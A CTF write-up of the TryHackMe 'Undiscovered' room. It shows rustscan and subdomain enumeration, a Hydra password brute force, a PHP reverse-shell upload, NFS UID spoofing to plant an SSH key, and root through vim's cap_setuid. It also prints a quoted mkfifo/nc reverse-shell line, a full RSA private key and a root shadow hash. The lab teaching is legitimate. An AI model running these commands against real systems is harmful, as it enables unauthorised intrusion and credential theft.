---
title: TryHackMe Undiscovered Writeup
date: 2024-10-22
tags: [tryhackme, ctf]
author: nandakishor
---


This writeup covers my walkthrough of the TryHackMe 'Undiscovered' CTF challenge, where I used a variety of enumeration and brute-forcing techniques to gain access to the target system. Starting with an initial port scan using Rustscan, I identified several open services, including SSH and HTTP. Using tools like ffuf and Gobuster, I discovered additional directories and subdomains on the web server, revealing a login page.

##Recon
```
──(kali㉿kali)-[~/tmp]
└─$ rustscan -a 10.10.56.57 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.56.57:22
Open 10.10.56.57:80
Open 10.10.56.57:111
Open 10.10.56.57:2049
Open 10.10.56.57:39233
[~] Starting Script(s)

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack Apache httpd 2.4.18
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 2-3 (RPC #100227)
39233/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Enumerate the web
```
┌──(kali㉿kali)-[~/tmp]
└─$ ffuf -u http://undiscovered.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://undiscovered.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 1987ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 5001ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 180ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 199ms]
:: Progress: [20469/20469] :: Job [1/1] :: 191 req/sec :: Duration: [0:01:52] :: Errors: 0 ::
```
Nothing in the website so enumerate the subdomins


```
┌──(kali㉿kali)-[~/tmp]
└─$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u undiscovered.thm --append-domain | grep -v "Status: 302"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://undiscovered.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: manager.undiscovered.thm Status: 200 [Size: 4584]
Found: dashboard.undiscovered.thm Status: 200 [Size: 4626]
Found: deliver.undiscovered.thm Status: 200 [Size: 4650]
Found: newsite.undiscovered.thm Status: 200 [Size: 4584]
Found: develop.undiscovered.thm Status: 200 [Size: 4584]
Found: network.undiscovered.thm Status: 200 [Size: 4584]
```
![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 093248.png>)

Enumerate directories
```
                                                                                                                                                 
┌──(kali㉿kali)-[~/tmp]
└─$ ffuf -u http://deliver.undiscovered.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://deliver.undiscovered.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 3712ms]
.htaccess               [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 4726ms]
LICENSE                 [Status: 200, Size: 32472, Words: 5350, Lines: 622, Duration: 212ms]
cms                     [Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 198ms]
data                    [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 177ms]
files                   [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 185ms]
js                      [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 202ms]
media                   [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 202ms]
server-status           [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 200ms]
```



![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 093404.png>)

its a login page

```
┌──(kali㉿kali)-[~/tmp]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-27 09:36:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-27 09:36:36
```
bruteforce to find the password

`admin:liverpool`

![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 093816.png>)

we can upload file in here, so upload a php rev shell

![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 093946.png>)

![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 094016.png>)



mount the directory into our machine

```
┌──(kali㉿kali)-[~/tmp]
└─$ mkdir mnt                            
                                                                                                    
┌──(kali㉿kali)-[~/tmp]
└─$ sudo mount -t nfs 10.10.3.41:/home/william mnt
[sudo] password for kali: 
                                                                                                    
┌──(kali㉿kali)-[~/tmp]
└─$ cd mnt    
cd: permission denied: mnt
                                     
┌──(kali㉿kali)-[~/tmp]
└─$ sudo useradd -u 3003 william
                                                                                                    
┌──(kali㉿kali)-[~/tmp]
└─$ sudo passwd william

New password: 
Retype new password: 
passwd: password updated successfully
                                                                                                    
┌──(kali㉿kali)-[~/tmp]
└─$ su william         
Password: 
$ cd mnt	
sh: 1: cd: can't cd to mnt
$ ls
bg.jpg	dir  mnt
$ bash
william@kali:/home/kali/tmp$ cd mnt
william@kali:/home/kali/tmp/mnt$ ls
admin.sh  script  user.txt
william@kali:/home/kali/tmp/mnt$ 
```

```
william@kali:/home/kali/tmp/mnt$ cat user.txt
THM{8d7b7299cccd*****01d0e091c}
william@kali:/home/kali/tmp/mnt$
```


##create ssh key and login 
```
william@kali:/home/kali/tmp/mnt$ cat admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
william@kali:/home/kali/tmp/mnt$ ssh-keygen -f william
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:fZBD9q0YFO+5CoshiVjmdoNosrQyuKNPc+21vNrD6Wc william@kali
The key's randomart image is:
+--[ED25519 256]--+
|          =.     |
|         + + .   |
|          = o .  |
|         . * o   |
|  o     S o =    |
| * o o     . .   |
|=oB * o.o.  .    |
|O+.+ + *++E.     |
|**.   +oB=.      |
+----[SHA256]-----+
william@kali:/home/kali/tmp/mnt$ ls
admin.sh  script  user.txt  william  william.pub
william@kali:/home/kali/tmp/mnt$ mkdir .ssh
william@kali:/home/kali/tmp/mnt$ cat william.pub > .ssh/authorized_keys
william@kali:/home/kali/tmp/mnt$ chmod 600 william
william@kali:/home/kali/tmp/mnt$ 
```

```
william@kali:/home/kali/tmp/mnt$ ssh -i william william@10.10.3.41
The authenticity of host '10.10.3.41 (10.10.3.41)' can't be established.
ED25519 key fingerprint is SHA256:0ksd7ve03T/DLd54sg0vUZNd72YgJT1g2iL1CP0r9+Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/william/.ssh' (No such file or directory).
Failed to add the host to the list of known hosts (/home/william/.ssh/known_hosts).
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$ 
```
we get shell as william

```
admin.sh  script  user.txt  william  william.pub
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
william@undiscovered:~$
```

Get the shell as leonard

```
william@undiscovered:~$ ./script .ssh/id_rsa > leonard
william@undiscovered:~$ ls
admin.sh  leonard  script  user.txt  william  william.pub
william@undiscovered:~$ chmod 600 leonard
william@undiscovered:~$ ssh -i leonard leonard@undiscovered
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ 
```

```
leonard@undiscovered:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
:py
:exec python -c 'import os;os.setuid(0);os.system("id")'
:%! python -c 'print "A"'
:! python -c 'import os;os.setuid(0);os.system("sh -p")'
:%! python -c 'import os;os.setuid(0);os.system("id")'
:!/sh -p

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'1  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
'2  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'3  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

```
the user is using vim to execute some rev shell, so find the suid of vim, noting intersting, so check the capabilities



```
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```
![alt text](<../assets/images/undiscovered/Screenshot 2024-10-27 100440.png>)


```
$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(develope
```
```# cat /etc/shadow | grep -i root
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
# 
```